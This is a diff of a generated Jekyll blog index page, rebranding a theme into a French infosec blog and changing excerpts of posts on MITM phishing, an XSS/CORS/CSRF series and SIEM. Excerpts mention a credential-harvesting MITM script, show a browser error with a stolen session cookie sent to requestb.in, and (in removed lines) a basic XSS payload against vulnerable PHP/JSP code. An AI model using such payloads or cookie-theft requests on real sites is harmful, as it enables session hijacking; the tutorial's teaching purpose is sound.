@@ -9,7 +9,7 @@
 
   <title>
     
-      Lanyon &middot; A Jekyll theme
+      phackt.com:~# &middot; Let's talk about sec, baby!
     
   </title>
 
@@ -40,7 +40,7 @@
 <!-- Toggleable sidebar -->
 <div class="sidebar" id="sidebar">
   <div class="sidebar-item">
-    <p>A reserved <a href="https://jekyllrb.com" target="_blank">Jekyll</a> theme that places the utmost gravity on content with a hidden drawer. Made by <a href="https://twitter.com/mdo" target="_blank">@mdo</a>.</p>
+    <p>Some infosec stuff.</p>
   </div>
 
   <nav class="sidebar-nav">
@@ -60,7 +60,7 @@
     
       
         
-          <a class="sidebar-nav-item" href="http://localhost:4000/about/">About</a>
+          <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
         
       
     
@@ -86,6 +86,10 @@
     
       
         
+      
+    
+      
+    
       
     
 
@@ -108,8 +112,8 @@
       <div class="masthead">
         <div class="container">
           <h3 class="masthead-title">
-            <a href="/" title="Home">Lanyon</a>
-            <small>A Jekyll theme</small>
+            <a href="/" title="Home">phackt.com:~#</a>
+            <small>Let's talk about sec, baby!</small>
           </h3>
         </div>
       </div>
@@ -119,114 +123,92 @@
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/mitm/2016/09/08/mitm-phishing/">
+      <a href="http://localhost:4000/mitm-phishing">
         Phishing d'un site web avec attaque MITM
       </a>
     </h1>
 
     <span class="post-date">08 Sep 2016</span>
 
-    <p><br />
-Bonjour à tous,</p>
+    <p>Bonjour à tous,</p>
+
+<p>Je me suis dit qu’il était intéressant de partager avec vous un script <strong>Bash</strong> que j’ai créé pour automatiser une attaque ‘Man In The Middle’ et rediriger vers une fausse page web que nous allons héberger (<a href="https://github.com/phackt/mitm">https://github.com/phackt/mitm</a>). L’objectif est pour une attaque ciblée de rendre l’obtention des credentials la plus transparente possible. Cependant il n’existe pas de solution miracle, à chaque combat sa stratégie.</p>
 
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2016/08/20/xss-cors-csrf-partie-3-cors-csrf/">
+      <a href="http://localhost:4000/xss-cors-csrf-partie-3-cors-csrf">
         XSS, CORS, CSRF (Partie 3)
       </a>
     </h1>
 
     <span class="post-date">20 Aug 2016</span>
 
-    <h2 id="les-requêtes-cross-site">Les requêtes Cross-Site.</h2>
+    <h3 id="les-requêtes-cross-site">Les requêtes Cross-Site.</h3>
+
+<p>Bienvenue dans ce dernier volet de notre Saga XSS (<a href="http://localhost:4000/xss-cors-csrf-partie-1-xss">partie 1</a>, <a href="http://localhost:4000/xss-cors-csrf-partie-2-xss-cookies-session">partie 2</a>).</p>
+
+<p>Dans notre précédent article nous avions récupéré un cookie de session insuffisamment sécurisé grâce à une vulnérabilité XSS. Vous étiez nombreux dans ma tête à me demander pourquoi ce message d’erreur (ici Chrome mais le fonctionnement est identique sous IE, Firefox) :</p>
+
+<pre class="alert">
+XMLHttpRequest cannot load http://requestb.in/w7iy5sw7?cookie=PHPSESSID_unsecured=jm5mah0a9uuf4g344096nled73. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
+</pre>
 
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2016/08/15/xss-cors-csrf-partie-2-xss-cookies-session/">
+      <a href="http://localhost:4000/xss-cors-csrf-partie-2-xss-cookies-session">
         XSS, CORS, CSRF (Partie 2)
       </a>
     </h1>
 
     <span class="post-date">15 Aug 2016</span>
 
-    <h2 id="xss--et-vol-de-cookies-par-la-pratique">XSS  et vol de cookies par la pratique.</h2>
+    <h3 id="xss--et-vol-de-cookies-par-la-pratique">XSS  et vol de cookies par la pratique.</h3>
+
+<p><strong>Vous reprendrez bien un cookie ?</strong></p>
+
+<p>Dans le <a href="http://localhost:4000/xss-cors-csrf-partie-1-xss">premier volet</a> de notre saga, nous traitions des attaques XSS et des moyens de s’en prémunir. Ces vulnérabilités peuvent être utilisées pour voler vos informations de session ou vous rediriger vers un site frauduleux. Vous vous dîtes sûrement : “ok coco en théorie c’est bien sympa tout ça, mais en quoi consiste le vol d’une session, quelles informations sont envoyées et où part la requête ?”.</p>
 
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/web/2016/08/09/xss-cors-csrf-partie-1-xss/">
+      <a href="http://localhost:4000/xss-cors-csrf-partie-1-xss">
         XSS, CORS, CSRF (Partie 1)
       </a>
     </h1>
 
     <span class="post-date">09 Aug 2016</span>
 
-    <h2 id="le-xss-cors-csrf-késako">Le XSS, CORS, CSRF… Késako?</h2>
+    <h3 id="le-xss-cors-csrf-késako">Le XSS, CORS, CSRF… Késako?</h3>
+
 <p><strong>Que se cache-t-il derrière ces acronymes barbares ?</strong></p>
 
 <p>Bienvenue dans cette saga qui traitera des notions de XSS, CORS, CSRF et du lien entre elles.<br />
 Vous en avez forcément entendu parler si vous avez été impliqués dans la création d’applications WEB. L’idée de cet article m’est venue suite à la création d’une application WEB “cas d’école” en Java <a href="https://github.com/phackt/DemoWebApp">https://github.com/phackt/DemoWebApp</a>. La question que nous nous posons est la suivante : <strong>quelles sont les bonnes pratiques pour sécuriser une application WEB ?</strong></p>
 
-<p>Dans ce premier volet, nous traiterons des attaques de cross-site scripting. Nous ferons le lien par la suite avec les protections CSRF (Cross Site Request Forgery) et les requêtes CORS (Cross Origin Ressource Sharing).</p>
-
-<h1 id="xss">XSS</h1>
-<p>Définition de Wikipédia :<br />
-<em>” Le cross-site scripting (abrégé XSS), est un type de faille de sécurité des sites web permettant d’injecter du contenu dans une page, permettant ainsi de provoquer des actions sur les navigateurs web visitant la page. Les possibilités des XSS sont très larges puisque l’attaquant peut utiliser tous les langages pris en charge par le navigateur (JavaScript, Java, Flash…) et de nouvelles possibilités sont régulièrement découvertes notamment avec l’arrivée de nouvelles technologies comme HTML5. Il est par exemple possible de rediriger vers un autre site pour de l’hameçonnage ou encore de voler la session en récupérant les cookies.”</em></p>
-
-<p>L’objectif est donc l’injection de code dans la page HTML pouvant être interprété par le navigateur. Si les balises permettant l’interprétation de code arbitraire ne sont pas bien filtrées, exemple classique avec la balise <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>, alors nous pourrons exécuter du code à l’insu de l’utilisateur. <br />
-Il existe deux types d’attaques XSS, les réfléchies, et les stockées. Les réfléchies sont injectées dans la requête et le code interprétable n’est pas stocké de façon permanente sur le serveur.</p>
-
-<p>Un exemple basique sur une page PHP :</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-  <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
-  <span class="k">echo</span> <span class="s2">"Welcome </span><span class="nv">$name</span><span class="s2">"</span><span class="p">;</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></div>
-
-<p>Un autre exemple en JSP :</p>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%</span> <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"name"</span><span class="o">);</span> <span class="o">%&gt;</span> 
-<span class="nc">Employee</span> <span class="nl">name:</span> <span class="o">&lt;%=</span> <span class="n">name</span> <span class="o">%&gt;</span>  
-</code></pre></div></div>
-
-<p>Si vous appelez <code class="language-plaintext highlighter-rouge">/index?name=&lt;script&gt;prompt(1)&lt;/script&gt;</code>, votre navigateur interprétera la balise <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> et affichera un donc un prompt. Aucun intérêt ici mais on vous laisse deviner la portée d’une telle attaque : un payload javascript pourra voler vos informations de session (<em>document.cookie</em>), envoyer des requêtes à votre insu sur le site vulnérable ou faire de la redirection dans un but d’hameçonnage. Les attaques XSS Reflected sont souvent associées à de l’ingénierie sociale car l’utilisateur doit accéder à un lien provoquant l’exécution du code.</p>
-
-<p>Cependant ce code peut être stocké de façon permanente dans les attaques XSS Stored. Le principe est le même sauf que le code est stocké sur le serveur, le cas classique étant un forum vulnérable qui sauvegarde les messages infectés (<a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29">OWASP (Open Web Application Security Project) Cross-Site Scripting</a>).</p>
-
-<h1 id="comment-sen-prémunir-">Comment s’en prémunir ?</h1>
-
-<p>Il convient d’assainir en entrée les données (Filter) et d’encoder l’information pour les réponses HTTP. Tout dépend du langage de programmation, framework utilisé, et également de l’endroit où se situe point d’injection.</p>
-
-<p>Par exemple si vous travaillez avec Spring MVC pour échapper les outputs:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;context-param&gt;
-   &lt;param-name&gt;defaultHtmlEscape&lt;/param-name&gt;
-   &lt;param-value&gt;true&lt;/param-value&gt;
-&lt;/context-param&gt;
-</code></pre></div></div>
-
-<p>Cependant ceci n’échappera que les Spring tags: <code class="language-plaintext highlighter-rouge">&lt;form:input path="formField" htmlEscape="true" /&gt;</code> ou bien <code class="language-plaintext highlighter-rouge">&lt;spring:message code="label.name.first"&gt;</code></p>
-
-<p>Si vous codez des pages JSP :</p>
-
   </div>
   
   <div class="post">
     <h1 class="post-title">
-      <a href="http://localhost:4000/general/2016/08/05/introduction-siem/">
+      <a href="http://localhost:4000/introduction-siem">
         Introduction au SIEM
       </a>
     </h1>
 
     <span class="post-date">05 Aug 2016</span>
 
-    <h1 id="siem-le-monitoring-de-la-sécurité">SIEM, le monitoring de la sécurité</h1>
+    <h3 id="siem-le-monitoring-de-la-sécurité">SIEM, le monitoring de la sécurité</h3>
+
 <p>Nous avons vu dans un précédent article quel était le contexte réglementaire de la <a href="http://localhost:4000/introduction-cybersecurite">Loi de Programmation Militaire</a> française.</p>
+
+<p><strong>Que dites-vous d’une petite révision ?</strong></p>
+
+<p>La LPM impose aux <strong>OIV</strong> (Opérateurs d’Importance Vitale) de renforcer la sécurité des systèmes d’information critiques qu’ils exploitent et de notifier les incidents de sécurité à l’<a href="http://www.ssi.gouv.fr/">ANSSI</a> (Agence Nationale de la Sécurité des Systèmes d’Information).<br />
+Une première vague d’arrêtés a été publiée le 1er juillet 2016. Ces arrêtés concernent les secteurs d’activité des produits de santé, la gestion de l’eau et l’alimentation. Plusieurs autres arrêtés, concernant d’autres secteurs d’activité, devraient paraître d’ici la fin de cette année.</p>
 
   </div>
   
